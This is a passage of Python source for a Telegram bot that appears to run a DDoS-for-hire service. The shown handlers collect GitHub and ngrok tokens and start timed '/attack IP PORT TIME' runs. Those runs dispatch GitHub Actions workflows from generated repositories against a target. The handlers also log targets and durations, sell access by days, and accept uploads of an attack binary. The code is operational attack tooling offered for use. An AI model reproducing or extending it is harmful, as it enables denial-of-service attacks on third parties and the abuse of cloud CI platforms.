        await update.message.reply_text(f"✅ **SAVED {count} GITHUB TOKENS**")
    else:
        text = update.message.text.replace("/setgithub", "").strip()
        if not text:
            await update.message.reply_text("💡 **Send GitHub PAT tokens or upload .txt file**")
            return
        tokens = [t.strip() for t in text.split() if t.strip()]
        for token in tokens:
            save_github_token(user_id, token)
        await update.message.reply_text(f"✅ **SAVED {len(tokens)} GITHUB TOKENS**")
    clean_github_tokens()  # Clean duplicates and dead tokens after adding

async def cmd_setngrok(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.replace("/setngrok", "").strip()
    if not text:
        await update.message.reply_text("💡 **Send Ngrok auth token**")
        return
    save_ngrok_token(user_id, text)
    clean_ngrok_tokens()  # Clean duplicates and dead tokens after adding
    await update.message.reply_text("✅ **NGROK TOKEN SAVED**")

async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    status = ATTACK_STATUS.get(chat_id, {})
    users = get_users()
    github_tokens = get_user_github_tokens(user_id)
    ngrok_tokens = get_user_ngrok_tokens(user_id)
    
    # 🎯 TUNNEL STATUS CHECK
    tunnel_status = "❌ **NO ACTIVE TUNNELS**"
    active_tunnels = [t for t in ACTIVE_TUNNELS if t.startswith(f"{chat_id}_")]
    if active_tunnels:
        tunnel_status = f"✅ **ACTIVE TUNNELS ({len(active_tunnels)})**\n"
        for tunnel_key in active_tunnels:
            tunnel_data = ACTIVE_TUNNELS[tunnel_key]['data']
            tunnel_url = extract_tunnel_url(tunnel_data)
            tunnel_status += f"🔗 `{tunnel_url}` (Token: {ACTIVE_TUNNELS[tunnel_key]['token'][:12]}...)\n"
    
    status_text = f"""
🎯 **ATTACK STATUS:**
{'🔥 **ACTIVE MULTI-TOKEN ATTACK**' if status.get("running") else '💤 **NO ACTIVE ATTACK**'}

🌐 **TUNNEL STATUS:**
{tunnel_status}

📊 **TOKEN STATUS:**
🔑 GitHub: {len([t for t in github_tokens if validate_github_token(t)])}/{len(github_tokens)} ✅
🌐 Ngrok: {len([t for t in ngrok_tokens if validate_ngrok_token(t)])}/{len(ngrok_tokens)} ✅

👤 **USER STATUS:**
{'✅ APPROVED' if is_user_approved(user_id) else '❌ PENDING'}
{'👑 OWNER' if is_owner(user_id) else '🛡️ ADMIN' if is_admin(user_id) else '👤 USER'}
"""
    
    # 🎯 ACTIVE ATTACK DETAILS
    if status.get("running"):
        time_left = status["until"] - datetime.utcnow()
        status_text += f"""
⚡ **ATTACK DETAILS:**
🎯 Target: `{status['target']}`
🕒 Started: {status['start_time'][11:19]} UTC
⏱ Time Left: {max(0, int(time_left.total_seconds()))}s
📁 Repositories: {len(status['repos'])}
🔑 GitHub Tokens: {len(status['github_tokens'])}
🔗 Tunnels: {len(status['tunnel_urls'])}
📈 Workflows: {status['workflows_dispatched']}
"""
    
    # 🎯 AVAILABLE TUNNELS COUNT
    active_tunnels_count = len(ACTIVE_TUNNELS)
    status_text += f"\n🔗 **Total Active Tunnels:** {active_tunnels_count}"
    
    await send_rajaxflame_message(context, chat_id, status_text, "status")

async def cmd_tunnel_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Detailed tunnel status only"""
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    
    tunnel_text = ""
    
    # 🎯 CURRENT CHAT TUNNELS
    active_tunnels = [t for t in ACTIVE_TUNNELS if t.startswith(f"{chat_id}_")]
    if active_tunnels:
        tunnel_text += f"""
🎯 **YOUR ACTIVE TUNNELS ({len(active_tunnels)}):**
"""
        for tunnel_key in active_tunnels:
            tunnel_data = ACTIVE_TUNNELS[tunnel_key]['data']
            tunnel_url = extract_tunnel_url(tunnel_data)
            tunnel_text += f"""
🔗 URL: `{tunnel_url}`
🆔 ID: `{tunnel_data.get('id', 'N/A')}`
📊 Status: `{tunnel_data.get('status', 'active')}`
⏰ Created: Recently
🔑 Token: `{ACTIVE_TUNNELS[tunnel_key]['token'][:12]}...`
"""
    else:
        tunnel_text += """
❌ **NO ACTIVE TUNNELS**

💡 **To create tunnels:**
Use `/create PORT` or `/attack IP PORT TIME`
Tunnels automatically created during attack
"""
    
    # 🎯 USER'S NGROK TOKENS STATUS
    ngrok_tokens = get_user_ngrok_tokens(user_id)
    if ngrok_tokens:
        valid_tokens = [t for t in ngrok_tokens if validate_ngrok_token(t)]
        tunnel_text += f"""
🔑 **YOUR NGROK TOKENS:**
✅ Valid: {len(valid_tokens)}
📜 Total: {len(ngrok_tokens)}
🟢 Ready: {'YES' if valid_tokens else 'NO'}
"""
    else:
        tunnel_text += """
❌ **NO NGROK TOKENS FOUND**

💡 **Add tokens using:**
/setngrok YOUR_NGROK_TOKEN
"""
    
    # 🎯 GLOBAL TUNNELS STATS
    active_tunnels_count = len(ACTIVE_TUNNELS)
    tunnel_text += f"""
🌐 **GLOBAL TUNNELS:**
🔗 Active: {active_tunnels_count}
👥 Users: {len(set([k.split('_')[0] for k in ACTIVE_TUNNELS.keys()]))}
"""
    
    await send_rajaxflame_message(context, chat_id, tunnel_text, "tunnel")

async def cmd_my_tunnels(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show all active tunnels for user"""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    active_tunnels = [t for t in ACTIVE_TUNNELS if t.startswith(f"{chat_id}_")]
    
    if not active_tunnels:
        await update.message.reply_text("""
🌐 **NO ACTIVE TUNNELS**

💡 Your tunnels will appear here when you use /create or /attack command
""")
        return
    
    tunnels_text = f"""
📊 **Total Active:** {len(active_tunnels)}
"""
    
    for i, tunnel_key in enumerate(active_tunnels, 1):
        tunnel_info = ACTIVE_TUNNELS[tunnel_key]
        tunnel_url = extract_tunnel_url(tunnel_info['data'])
        tunnels_text += f"""
🔗 **Tunnel {i}:**
🌐 URL: `{tunnel_url}`
💬 Chat: {chat_id}
⏰ Status: ✅ ACTIVE
🔑 Token: `{tunnel_info['token'][:12]}...`
"""
    
    await send_rajaxflame_message(context, chat_id, tunnels_text, "tunnel")

async def cmd_tunnel_test(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Test ngrok tunnel functionality"""
    user_id = update.effective_user.id
    ngrok_tokens = get_user_ngrok_tokens(user_id)
    
    if not ngrok_tokens:
        await update.message.reply_text("❌ **No ngrok tokens found**")
        return
    
    msg = await update.message.reply_text("🔍 **Testing ngrok tokens...**")
    
    results = []
    for i, token in enumerate(ngrok_tokens, 1):
        await msg.edit_text(f"🔍 Testing token {i}/{len(ngrok_tokens)}...")
        
        # Validate token
        is_valid = validate_ngrok_token(token)
        status = "✅ Valid" if is_valid else "❌ Invalid"
        
        # Test tunnel creation
        tunnel_data = None
        if is_valid:
            tunnel_data = create_ngrok_tunnel(token, 8080)
            if tunnel_data:
                tunnel_url = extract_tunnel_url(tunnel_data)
                status += f" | ✅ Tunnel: {tunnel_url[:30]}..." if tunnel_url else " | ❌ Tunnel failed"
            else:
                status += " | ❌ Tunnel failed"
        
        results.append(f"Token {i}: {status}")
        
        # Cleanup
        if tunnel_data and 'id' in tunnel_data:
            delete_ngrok_tunnel(token, tunnel_data['id'])
    
    report = "🔧 **Ngrok Tunnel Test Results:**\n\n" + "\n".join(results)
    await msg.edit_text(report)

async def cmd_control(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text(f"❌ **ADMIN ACCESS REQUIRED**\n\nContact: {DEVELOPER_TAG}")
        return
    
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("Stop Attack", callback_data="stop_attack")],
        [InlineKeyboardButton("View Logs", callback_data="view_logs")],
        [InlineKeyboardButton("Manage Users", callback_data="manage_users")],
        [InlineKeyboardButton("Check Tokens", callback_data="check_tokens")]
    ])
    
    control_text = """
🎮 **CONTROL PANEL**

🔹 Stop ongoing attacks
🔹 View attack history
🔹 Manage approved users
🔹 Check token validity
"""
    await send_rajaxflame_message(context, update.effective_chat.id, control_text, "control", reply_markup=kb)

async def cmd_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text(f"❌ **ADMIN ACCESS REQUIRED**\n\nContact: {DEVELOPER_TAG}")
        return
    
    logs = load_json(ATTACK_LOGS_FILE, [])
    if not logs:
        await send_rajaxflame_message(context, update.effective_chat.id, "📜 **No Attack Logs Found**", "status")
        return
    
    log_text = "📜 **ATTACK LOGS**\n\n"
    for log in logs[-10:]:
        log_text += f"""
🕒 **Time**: {log['start_time'][11:19]} UTC
👤 **User ID**: {log['user_id']}
🎯 **Target**: {log['target']}
⏱ **Duration**: {log['duration']}s
⚡ **Workflows**: {log['workflows']}
📁 **Repositories**: {log.get('repos', 0)}
🌐 **Tunnels**: {len(log.get('tunnels', []))}
{'-'*30}
"""
    await send_rajaxflame_message(context, update.effective_chat.id, log_text, "status")

async def cmd_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # Get the appropriate message object based on update type
    if update.callback_query:
        msg = await update.callback_query.message.reply_text("Checking tokens…")
    else:
        msg = await update.message.reply_text("Checking tokens…")
    
    await asyncio.sleep(0.4)
    try:
        await msg.edit_text("Checking tokens ▰▱▱")
    except Exception:
        pass
    
    github_lines = load_github_tokens()
    ngrok_lines = load_ngrok_tokens()
    
    if is_admin(user_id):
        results = {"github": {}, "ngrok": {}}
        for i, line in enumerate(github_lines, 1):
            u, tok = line.split(":", 1)
            alive = validate_github_token(tok)
            results["github"].setdefault(u, {})[tok[:10] + "…"] = "live" if alive else "dead"
            if i % 5 == 0:
                try:
                    await msg.edit_text(f"Progress {i}/{len(github_lines)}")
                except Exception:
                    pass
        for i, line in enumerate(ngrok_lines, 1):
            u, tok = line.split(":", 1)
            alive = validate_ngrok_token(tok)
            results["ngrok"].setdefault(u, {})[tok[:10] + "…"] = "live" if alive else "dead"
        save_json(TOKENS_STATUS_FILE, results)
        
        # Send document based on update type
        if update.callback_query:
            await update.callback_query.message.reply_document(InputFile(TOKENS_STATUS_FILE))
        else:
            await update.message.reply_document(InputFile(TOKENS_STATUS_FILE))
            
        try:
            await msg.edit_text("Done.")
        except Exception:
            pass
    else:
        github_own = [ln for ln in github_lines if ln.startswith(f"{user_id}:")]
        ngrok_own = [ln for ln in ngrok_lines if ln.startswith(f"{user_id}:")]
        github_live = github_dead = ngrok_live = ngrok_dead = 0
        rows = []
        for i, line in enumerate(github_own, 1):
            _, tok = line.split(":", 1)
            ok = validate_github_token(tok)
            if ok:
                github_live += 1
                rows.append(f"GitHub {tok[:12]}…: ✅ live")
            else:
                github_dead += 1
                rows.append(f"GitHub {tok[:12]}…: ❌ dead")
        for i, line in enumerate(ngrok_own, 1):
            _, tok = line.split(":", 1)
            ok = validate_ngrok_token(tok)
            if ok:
                ngrok_live += 1
                rows.append(f"Ngrok {tok[:12]}…: ✅ live")
            else:
                ngrok_dead += 1
                rows.append(f"Ngrok {tok[:12]}…: ❌ dead")
        final_text = "Your tokens:\n" + "\n".join(rows) + f"\n\nGitHub: {github_live} live, {github_dead} dead\nNgrok: {ngrok_live} live, {ngrok_dead} dead"
        try:
            await msg.edit_text(final_text)
        except Exception:
            # Use appropriate message method based on update type
            if update.callback_query:
                await update.callback_query.message.reply_text(final_text)
            else:
                await update.message.reply_text(final_text)
    
    # Clean tokens after checking
    clean_github_tokens()
    clean_ngrok_tokens()

async def cmd_add(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text(f"❌ **ADMIN ACCESS REQUIRED**\n\nContact: {DEVELOPER_TAG}")
        return
    if len(context.args) != 2:
        await update.message.reply_text("💡 **Usage:** /add USERID DAYS")
        return
    try:
        target_user = int(context.args[0])
        days = int(context.args[1])
        add_user(target_user, days)
        await update.message.reply_text(f"✅ **USER {target_user} ADDED FOR {days} DAYS**")
    except ValueError:
        await update.message.reply_text("❌ **INVALID USERID OR DAYS**")

async def cmd_remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text(f"❌ **ADMIN ACCESS REQUIRED**\n\nContact: {DEVELOPER_TAG}")
        return
    if len(context.args) != 1:
        await update.message.reply_text("💡 **Usage:** /remove USERID")
        return
    try:
        target_user = int(context.args[0])
        remove_user(target_user)
        await update.message.reply_text(f"✅ **USER {target_user} REMOVED**")
    except ValueError:
        await update.message.reply_text("❌ **INVALID USERID**")

async def cmd_addadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text(f"❌ **OWNER ACCESS REQUIRED**\n\nContact: {DEVELOPER_TAG}")
        return
    if len(context.args) != 1:
        await update.message.reply_text("💡 **Usage:** /addadmin USERID")
        return
    try:
        target_user = int(context.args[0])
        add_admin(target_user)
        await update.message.reply_text(f"✅ **ADMIN {target_user} ADDED**")
    except ValueError:
        await update.message.reply_text("❌ **INVALID USERID**")

async def cmd_removeadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text(f"❌ **OWNER ACCESS REQUIRED**\n\nContact: {DEVELOPER_TAG}")
        return
    if len(context.args) != 1:
        await update.message.reply_text("💡 **Usage:** /removeadmin USERID")
        return
    try:
        target_user = int(context.args[0])
        remove_admin(target_user)
        await update.message.reply_text(f"✅ **ADMIN {target_user} REMOVED**")
    except ValueError:
        await update.message.reply_text("❌ **INVALID USERID**")

async def cmd_threads(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text(f"❌ **ADMIN ACCESS REQUIRED**\n\nContact: {DEVELOPER_TAG}")
        return
    if not context.args:
        await update.message.reply_text("💡 **Usage:** /threads NUMBER")
        return
    try:
        threads = int(context.args[0])
        set_default_threads(threads)
        await update.message.reply_text(f"✅ **Default threads set to {threads}**")
    except ValueError:
        await update.message.reply_text("❌ **Invalid number**")

async def cmd_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text(f"❌ **ADMIN ACCESS REQUIRED**\n\nContact: {DEVELOPER_TAG}")
        return
    await update.message.reply_text(f"📤 **Upload binary named '{BINARY_NAME}' now**")

async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    if not is_admin(user_id):
        await update.message.reply_text(f"❌ **ADMIN ACCESS REQUIRED**\n\nContact: {DEVELOPER_TAG}")
        return
    status = ATTACK_STATUS.get(chat_id, {})
    if not status.get("running"):
        await send_rajaxflame_message(context, chat_id, "💤 **No Active Attacks to Stop**", "control")
        return
    try:
        for repo in status.get("repos", []):
            for token in status.get("github_tokens", []):
                gh_delete_repo(token.replace("...", ""), repo)
        for tunnel_key in [k for k in ACTIVE_TUNNELS if k.startswith(f"{chat_id}_")]:
            ngrok_token = ACTIVE_TUNNELS[tunnel_key]["token"]
            delete_ngrok_tunnel(ngrok_token, ACTIVE_TUNNELS[tunnel_key]["data"]["id"])
            del ACTIVE_TUNNELS[tunnel_key]
        ATTACK_STATUS[chat_id]["running"] = False
        await send_rajaxflame_message(context, chat_id, "🛑 **Attack Stopped Successfully**", "control")
    except Exception as e:
        await send_rajaxflame_message(context, chat_id, f"⚠️ **Failed to Stop Attack**: {str(e)}", "control")

async def on_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    doc = update.message.document
    if not doc:
        return
    if doc.file_name == BINARY_NAME and is_admin(user_id):
        if os.path.exists(BINARY_PATH):
            os.remove(BINARY_PATH)
        f = await doc.get_file()
        await f.download_to_drive(custom_path=BINARY_PATH)
        await update.message.reply_text(f"✅ **Binary '{BINARY_NAME}' saved**")

async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    chat_id = update.effective_chat.id
    
    if query.data == "stop_attack":
        status = ATTACK_STATUS.get(chat_id, {})
        if not status.get("running"):
            await query.edit_message_text("💤 **No Active Attacks to Stop**")
            return
        try:
            for repo in status.get("repos", []):
                for token in status.get("github_tokens", []):
                    gh_delete_repo(token.replace("...", ""), repo)
            for tunnel_key in [k for k in ACTIVE_TUNNELS if k.startswith(f"{chat_id}_")]:
                ngrok_token = ACTIVE_TUNNELS[tunnel_key]["token"]
                delete_ngrok_tunnel(ngrok_token, ACTIVE_TUNNELS[tunnel_key]["data"]["id"])
                del ACTIVE_TUNNELS[tunnel_key]
            ATTACK_STATUS[chat_id]["running"] = False
            await query.edit_message_text("🛑 **Attack Stopped Successfully**")
        except Exception as e:
            await query.edit_message_text(f"⚠️ **Failed to Stop Attack**: {str(e)}")
    
    elif query.data == "view_logs":
        logs = load_json(ATTACK_LOGS_FILE, [])
        if not logs:
            await query.edit_message_text("📜 **No Attack Logs Found**")
            return
        log_text = "📜 **ATTACK LOGS**\n\n"
        for log in logs[-10:]:
            log_text += f"""
🕒 **Time**: {log['start_time'][11:19]} UTC
👤 **User ID**: {log['user_id']}
🎯 **Target**: {log['target']}
⏱ **Duration**: {log['duration']}s
⚡ **Workflows**: {log['workflows']}
📁 **Repositories**: {log.get('repos', 0)}
🌐 **Tunnels**: {len(log.get('tunnels', []))}
{'-'*30}
"""
        await query.edit_message_text(log_text)
    
    elif query.data == "manage_users":
        if not os.path.exists(USERS_FILE):
            save_json(USERS_FILE, {})
        await query.message.reply_document(InputFile(USERS_FILE))
    
    elif query.data == "check_tokens":
        await cmd_check(update, context)

# ================ 🏗️ APPLICATION BUILDER 🏗️ ================
def build_rajaxflame_app():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("attack", cmd_attack))
    app.add_handler(CommandHandler("run", cmd_run))
    app.add_handler(CommandHandler("create", cmd_create))  # ✅ NEW COMMAND ADDED
    app.add_handler(CommandHandler("setgithub", cmd_setgithub))
    app.add_handler(CommandHandler("setngrok", cmd_setngrok))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("tunnelstatus", cmd_tunnel_status))
    app.add_handler(CommandHandler("mytunnels", cmd_my_tunnels))
    app.add_handler(CommandHandler("tunneltest", cmd_tunnel_test))
    app.add_handler(CommandHandler("control", cmd_control))
    app.add_handler(CommandHandler("logs", cmd_logs))
    app.add_handler(CommandHandler("add", cmd_add))
    app.add_handler(CommandHandler("remove", cmd_remove))
    app.add_handler(CommandHandler("addadmin", cmd_addadmin))
    app.add_handler(CommandHandler("removeadmin", cmd_removeadmin))
    app.add_handler(CommandHandler("threads", cmd_threads))
    app.add_handler(CommandHandler("file", cmd_file))
    app.add_handler(CommandHandler("stop", cmd_stop))
    app.add_handler(CommandHandler("check", cmd_check))
    app.add_handler(CallbackQueryHandler(on_button))
    app.add_handler(MessageHandler(filters.Document.ALL, on_document))
    
    return app

if __name__ == "__main__":
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    print("""
╔══════════════════════════════╗
║    🔥 **RAJAXFLAME v3.0**    ║
║    ⚡ **ULTRA INSTANT**      ║
║    💥 **MULTI-TOKEN ATTACK** ║
║    🌐 **TUNNEL CREATION**    ║
╚══════════════════════════════╝
    """)
    app = build_rajaxflame_app()
    app.run_polling()